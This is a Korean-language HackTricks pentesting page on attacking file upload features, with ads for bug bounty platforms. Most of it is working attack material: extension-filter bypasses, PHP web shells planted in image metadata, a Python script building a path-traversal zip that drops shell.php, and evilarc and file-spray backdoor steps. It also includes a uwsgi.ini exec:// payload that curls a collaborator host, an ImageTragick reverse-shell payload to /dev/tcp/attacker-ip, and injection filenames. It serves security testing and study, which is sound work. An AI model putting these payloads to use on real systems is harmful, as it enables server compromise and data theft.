# 파일 업로드

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**버그 바운티 팁**: **해커들이 만든 프리미엄 버그 바운티 플랫폼**인 **Intigriti에 가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 바운티를 최대 **$100,000**까지 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 파일 업로드 일반적인 방법론

유용한 확장자:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8에서 작동**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws 웹 서버**: _.yaws_

### 파일 확장자 확인 우회

1. 적용되는 경우 **이전 확장자를 확인**하세요. 대문자를 사용하여 테스트하세요: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자를 추가**하여 확인하세요 (이전 확장자도 사용하세요):_
* _file.png.php_
* _file.png.Php5_
3. **끝에 특수 문자를 추가**해보세요. Burp를 사용하여 모든 **ascii** 및 **Unicode** 문자를 **브루트포스**할 수 있습니다. (_이전에 언급한 **확장자**를 사용할 수도 있습니다._)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. **확장자 파서를 속이는** 보호 기능을 우회하기 위해 **확장자를 두 번** 쓰거나 **잡동사니** 데이터(널 바이트)를 확장자 사이에 추가하는 기술을 사용해보세요. (_더 나은 페이로드를 준비하기 위해 **이전 확장자**를 사용할 수도 있습니다._)
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. 이전 확인에 **다른 레이어의 확장자**를 추가하세요:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **유효한 확장자 앞에 실행 확장자를 놓고** 서버가 잘못 구성되었는지 확인하세요. (확장자가 .php로 끝나지 않아도 **.php**로 끝나는 모든 것이 코드를 실행하는 Apache 구성 오류를 악용하는 데 유용합니다):
* _예: file.php.png_
7. **Windows**에서 **NTFS 대체 데이터 스트림 (ADS)**를 사용하세요. 이 경우 금지된 확장자 뒤에 콜론 문자 ":"가 삽입되고 허용된 확장자 앞에 삽입됩니다. 결과적으로 금지된 확장자의 **빈 파일**이 서버에 생성됩니다 (예: "file.asax:.jpg"). 이 파일은 나중에 다른 기술을 사용하여 수정할 수 있습니다. 예를 들어 짧은 파일 이름을 사용하는 것입니다. "**::$data**" 패턴을 사용하여 비어 있지 않은 파일을 생성할 수도 있습니다. 따라서 이 패턴 뒤에 점 문자를 추가하는 것도 추가적인 제한을 우회하는 데 유용할 수 있습니다 (예: "file.asp::$data.")
8. 파일 이름 제한을 깨보세요. 유효한 확장자가 잘립니다. 악성 PHP가 남습니다. AAA<--SNIP-->AAA.php

```
# Linux 최대 255바이트
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 여기서 4를 빼고 .png을 추가
# 파일을 업로드하고 응답을 확인하여 허용되는 문자 수를 확인합니다. 예를 들어 236이라고 가정합니다.
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 페이로드 생성
AAA<--SNIP 232 A-->AAA.php.png
```
### Content-Type, Magic Number, 압축 및 크기 조정 우회

* **Content-Type** 검사를 우회하기 위해 **Content-Type** **헤더**의 **값**을 다음과 같이 설정합니다: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **단어 목록**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **매직 넘버** 검사를 우회하기 위해 파일의 **처음에 실제 이미지의 바이트**를 추가합니다 (_file_ 명령을 혼란시킵니다). 또는 **메타데이터**에 셸을 삽입할 수도 있습니다:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
또는 이미지에 **페이로드를 직접 삽입**할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* 이미지에 **압축이 추가**되는 경우, 예를 들어 [PHP-GD](https://www.php.net/manual/fr/book.image.php)와 같은 일반적인 PHP 라이브러리를 사용하여 압축을 추가하는 경우, 이전 기술은 유용하지 않을 수 있습니다. 그러나 **PLTE 청크** [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용하여 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* 웹 페이지에서는 예를 들어 PHP-GD 함수 `imagecopyresized` 또는 `imagecopyresampled`을 사용하여 **이미지 크기를 조정**할 수 있습니다. 그러나 **IDAT 청크** [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용하여 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* **이미지 크기 조정을 생존시키는** 페이로드를 만들기 위한 또 다른 기술로는 PHP-GD 함수 `thumbnailImage`를 사용할 수 있습니다. 그러나 **tEXt 청크** [**여기에서 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용하여 압축을 **생존시킬 수 있는** 텍스트를 삽입할 수 있습니다.
* [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### 기타 확인할 트릭

* 이미 업로드된 파일의 이름을 **변경**하는 취약점을 찾습니다 (확장자 변경).
* **로컬 파일 포함** 취약점을 찾아 백도어를 실행합니다.
* **가능한 정보 노출**:
1. **동일한 이름**의 **동일한 파일**을 **여러 번** (동시에) 업로드합니다.
2. 이미 **존재하는 파일** 또는 **폴더**의 **이름**으로 파일을 업로드합니다.
3. **“.”, “..”, 또는 “…”**을 파일 이름으로 사용하여 파일을 업로드합니다. 예를 들어, Apache의 **Windows**에서 애플리케이션이 업로드된 파일을 “/www/uploads/” 디렉토리에 저장하는 경우, “.” 파일 이름은 “/www/” 디렉토리에 “uploads”라는 파일을 생성합니다.
4. **NTFS**에서 **“…:.jpg”**와 같이 쉽게 삭제할 수 없는 파일을 업로드합니다. (Windows)
5. **Windows**에서 `|<>*?”`와 같은 **잘못된 문자**를 파일 이름으로 사용하여 파일을 업로드합니다. (Windows)
6. **Windows**에서 CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 및 LPT9와 같은 **예약된** (**금지된**) **이름**을 사용하여 파일을 업로드합니다.
* 또한 **실행 가능한** (.exe) 파일이나 **.html** (의심이 적은) 파일을 업로드하여 피해자가 실수로 열 때 **코드를 실행**해 보십시오.

### 특수 확장자 트릭

**PHP 서버**에 파일을 업로드하려는 경우, [코드 실행을 위한 **.htaccess** 트릭을 확인하십시오](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
**ASP 서버**에 파일을 업로드하려는 경우, [코드 실행을 위한 **.config** 트릭을 확인하십시오](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` 파일은 자바의 `.jar`와 유사하지만 PHP용이며, PHP로 실행하거나 스크립트 내에서 포함시킬 수 있습니다...

`.inc` 확장자는 파일을 가져오기 위해 사용되는 PHP 파일에 때때로 사용되므로 언젠가는 **이 확장자가 실행되도록 허용**되었을 수 있습니다.

## **Jetty RCE**

Jetty 서버에 XML 파일을 업로드할 수 있다면 [**새로운 \*.xml 및 \*.war가 자동으로 처리**되기 때문에 RCE를 얻을 수 있습니다](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서 다음 이미지에 나와 있는대로 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하고 셸을 기대하세요!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

이 취약점에 대한 자세한 탐색은 원본 연구를 참조하십시오: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

uWSGI 서버에서 원격 명령 실행 (RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있는 경우에만 악용할 수 있습니다. uWSGI 구성 파일은 "마법" 변수, 자리 표시자 및 연산자를 통합하기 위해 특정 구문을 사용합니다. 특히 `@(filename)`로 사용되는 '@' 연산자는 파일의 내용을 포함하기 위해 설계되었습니다. uWSGI에서 지원하는 다양한 스키마 중에서 "exec" 스키마는 특히 강력하며, 프로세스의 표준 출력에서 데이터를 읽을 수 있습니다. 이 기능은 `.ini` 구성 파일이 처리될 때 원격 명령 실행 또는 임의 파일 쓰기/읽기와 같은 악의적인 목적으로 조작될 수 있습니다.

다음은 악의적인 `uwsgi.ini` 파일의 예입니다. 다양한 스키마를 보여줍니다:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
페이로드의 실행은 구성 파일의 구문 분석 중에 발생합니다. 구성이 활성화되고 구문 분석되려면 uWSGI 프로세스를 다시 시작해야 합니다(장애 또는 서비스 거부 공격으로 인해 재시작될 수 있음) 또는 파일을 자동으로 다시로드해야 합니다. 자동으로 다시로드 기능이 활성화되어 있으면 변경 사항을 감지하고 지정된 간격으로 파일을 다시로드합니다.

uWSGI의 구성 파일 구문 분석의 유연성을 이해하는 것이 중요합니다. 특히, 이야기한 페이로드는 바이너리 파일(예: 이미지 또는 PDF)에 삽입될 수 있으므로 잠재적인 악용 범위가 확대됩니다.

## **wget 파일 업로드/SSRF 트릭**

일부 경우에는 서버가 **`wget`**을 사용하여 파일을 다운로드하고 **URL**을 지정할 수 있음을 발견할 수 있습니다. 이러한 경우 코드는 다운로드된 파일의 확장자가 허용 목록 내에 있는지 확인하여 허용된 파일만 다운로드되도록 보장할 수 있습니다. 그러나 **이러한 확인은 우회될 수 있습니다.**\
**리눅스**에서 **파일 이름**의 **최대** 길이는 **255**이지만, **wget**은 파일 이름을 **236**자로 잘라냅니다. "A"\*232+".php"+".gif"라는 이름의 파일을 다운로드할 수 있습니다. 이 파일 이름은 **확인**을 **우회**합니다(이 예제에서 **".gif"**는 **유효한** 확장자입니다) 그러나 `wget`은 파일 이름을 **"A"\*232+".php"**로 변경합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
**또 다른 옵션**으로 이 체크를 우회하기 위해 **HTTP 서버를 다른 파일로 리디렉션**시킬 수 있습니다. 그래서 초기 URL은 체크를 우회하게 되고, wget은 새 이름으로 리디렉션된 파일을 다운로드합니다. 이 방법은 **wget이 `--trust-server-names` 매개변수와 함께 사용될 때만 작동**합니다. 왜냐하면 wget은 리디렉션된 페이지를 원래 URL에 표시된 파일 이름으로 다운로드하기 때문입니다.


## 도구

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass)는 파일 업로드 메커니즘을 테스트하는 데 도움이 되는 강력한 도구입니다. 다양한 버그 바운티 기법을 활용하여 취약점을 식별하고 악용하는 프로세스를 단순화하여 웹 애플리케이션의 철저한 평가를 보장합니다.

## 파일 업로드에서 다른 취약점으로

* **파일 이름**을 `../../../tmp/lol.png`로 설정하고 **경로 순회**를 시도하세요.
* **파일 이름**을 `sleep(10)-- -.jpg`로 설정하면 **SQL 인젝션**을 성공할 수도 있습니다.
* **파일 이름**을 `<svg onload=alert(document.domain)>`로 설정하여 XSS를 성공할 수 있습니다.
* **파일 이름**을 `; sleep 10;`로 설정하여 명령 인젝션을 테스트하세요. (더 많은 [명령 인젝션 트릭은 여기에서 확인하세요](../command-injection.md))
* [이미지 (svg) 파일 업로드에서 **XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** 파일 **업로드** + **XSS** = [**서비스 워커** 악용](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svg 업로드에서 **XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [svg 파일 업로드를 통한 **오픈 리디렉션**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)에서 **다양한 svg 페이로드** 시도해보기
* [유명한 **ImageTrick** 취약점](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* 웹 서버에게 URL에서 이미지를 가져올 것을 알릴 수 있다면 [SSRF](../ssrf-server-side-request-forgery/)를 악용해볼 수 있습니다. 이 **이미지**가 **공개** 사이트에 **저장**될 것이라면 [https://iplogger.org/invisible/](https://iplogger.org/invisible/)에서 URL을 지정하여 모든 방문자의 정보를 **훔칠 수도** 있습니다.
* [PDF-Adobe 업로드로 **XXE와 CORS** 우회](pdf-upload-xxe-and-cors-bypass.md)
* 특별히 만든 PDF를 사용하여 XSS: [다음 페이지에서 **PDF 데이터를 주입하여 JS 실행**하는 방법을 소개합니다](../xss-cross-site-scripting/pdf-injection.md). PDF를 업로드할 수 있다면 주어진 지침에 따라 임의의 JS를 실행할 수 있는 PDF를 준비할 수 있습니다.
* \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 내용을 업로드하여 서버에 **안티바이러스**가 있는지 확인하세요.
* 파일 업로드 시 **크기 제한**이 있는지 확인하세요.

다음은 업로드로 달성할 수 있는 10가지 목록입니다 ([여기](https://twitter.com/SalahHasoneh1/status/1281274120395685889)에서 가져옴):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: 웹쉘 / RCE
2. **SVG**: 저장된 XSS / SSRF / XXE
3. **GIF**: 저장된 XSS / SSRF
4. **CSV**: CSV 인젝션
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML 인젝션 / XSS / 오픈 리디렉트
8. **PNG / JPEG**: 픽셀 플러드 공격 (DoS)
9. **ZIP**: LFI를 통한 RCE / DoS
10. **PDF / PPTX**: SSRF / 블라인드 XXE

#### Burp 확장

{% embed url="https://github.com/portswigger/upload-scanner" %}

## 매직 헤더 바이트

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

다른 파일 유형은 [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)를 참조하세요.

### 자동으로 압축 해제되는 Zip/Tar 파일 업로드

서버 내에서 압축이 해제될 ZIP을 업로드할 수 있다면 다음 두 가지 작업을 수행할 수 있습니다:

#### 심볼릭 링크

다른 파일에 대한 심볼릭 링크를 포함하는 링크를 업로드한 다음, 압축 해제된 파일에 액세스하여 연결된 파일에 액세스할 수 있습니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에서 압축 해제하기

압축 해제 중에 디렉토리에 파일이 예상치 못하게 생성되는 것은 중요한 문제입니다. 악성 파일 업로드를 통한 OS 수준의 명령 실행을 방지하기 위해 이러한 설정이 보호 기능을 제공할 것으로 예상되었지만, ZIP 아카이브 형식의 계층적 압축 지원 및 디렉토리 탐색 기능은 악용될 수 있습니다. 이를 통해 공격자는 대상 애플리케이션의 압축 해제 기능을 조작하여 제한을 우회하고 안전한 업로드 디렉토리를 탈출할 수 있습니다.

이러한 파일을 생성하기 위한 자동화된 악용 도구는 [**GitHub의 evilarc**](https://github.com/ptoomey3/evilarc)에서 사용할 수 있습니다. 이 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한, **evilarc와 함께 사용하는 심볼릭 링크 트릭**도 옵션입니다. `/flag.txt`와 같은 파일을 대상으로 하는 경우, 해당 파일에 대한 심볼릭 링크를 시스템에 생성해야 합니다. 이렇게 하면 evilarc가 작동 중에 오류를 만나지 않도록 보장할 수 있습니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예시입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**파일 스프레이를 위한 압축 악용**

자세한 내용은 [원본 게시물](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)을 확인하세요.


1. **PHP 쉘 생성**:
PHP 코드는 `$_REQUEST` 변수를 통해 전달된 명령을 실행합니다.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **파일 스프레이 및 압축 파일 생성**:
여러 파일을 생성하고 이러한 파일을 포함하는 zip 아카이브를 조립합니다.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Hex 편집기 또는 vi로 수정**:
zip 내부 파일의 이름을 vi 또는 hex 편집기를 사용하여 수정하여 디렉토리를 탐색하기 위해 "xxA"를 "../"로 변경합니다.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

이 콘텐츠를 이미지 확장자와 함께 업로드하여 취약점을 악용하세요 **(ImageMagick, 7.0.1-1)**
([exploit](https://www.exploit-db.com/exploits/39767)에서 가져옴)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP 쉘 삽입

PNG 파일의 IDAT 청크에 PHP 쉘을 삽입하면 특정 이미지 처리 작업을 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 이미지 크기 조정 및 리샘플링에 일반적으로 사용되므로 이와 관련하여 특히 중요합니다. 삽입된 PHP 쉘이 이러한 작업에 영향을 받지 않고 유지되는 능력은 특정 사용 사례에 대한 중요한 이점입니다.

["PNG IDAT 청크에 웹 쉘 인코딩"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)이라는 기사에서는 이 기술의 방법론과 잠재적인 응용 분야에 대해 자세히 설명하고 있습니다. 이 자료는 이 과정과 그 영향에 대한 포괄적인 이해를 제공합니다.

자세한 내용은 다음 링크에서 확인할 수 있습니다: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot 파일

Polyglot 파일은 사이버 보안에서 독특한 도구로 작용하여 여러 파일 형식에서 유효하게 존재할 수 있는 카멜레온 역할을 합니다. 흥미로운 예로는 GIF와 RAR 아카이브로 모두 작동하는 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있습니다. 이러한 파일은 이러한 조합에 국한되지 않고 GIF와 JS 또는 PPT와 JS와 같은 조합도 가능합니다.

Polyglot 파일의 핵심적인 유틸리티는 파일 유형에 기반하여 파일을 스크리닝하는 보안 조치를 우회할 수 있는 능력에 있습니다. 다양한 응용 프로그램에서는 JPEG, GIF 또는 DOC와 같은 특정 파일 형식만 업로드 허용하는 것이 일반적이며, 잠재적으로 유해한 형식(JS, PHP 또는 Phar 파일 등)의 위험을 완화하기 위한 것입니다. 그러나 Polyglot은 여러 파일 형식의 구조적 기준을 준수함으로써 이러한 제한을 은밀하게 우회할 수 있습니다.

그러나 Polyglot은 적용 가능한 확장자 정책에 따라 업로드의 성공 여부가 달릴 수 있습니다. 예를 들어, Polyglot이 PHAR 파일 (PHp ARchive)과 JPEG를 동시에 포함할 수 있더라도 시스템이 허용되는 확장자에 엄격한 경우, Polyglot의 단순한 구조적 이중성만으로는 업로드가 보장되지 않을 수 있습니다.

자세한 내용은 다음 링크에서 확인할 수 있습니다: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## 참고 자료

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: 해커들이 만든 프리미엄 버그 바운티 플랫폼인 **Intigriti**에 **가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 등록하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
